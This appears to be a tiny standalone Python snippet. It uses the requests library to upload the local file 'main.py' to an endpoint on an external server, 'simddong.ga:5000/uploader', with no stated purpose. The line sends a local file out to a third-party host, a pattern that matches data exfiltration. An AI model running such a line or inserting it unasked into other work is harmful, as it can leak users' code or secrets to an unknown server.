import requests as rq
rq.post('http://simddong.ga:5000/uploader', files={'file': ('main.py', open('main.py', 'rb'))})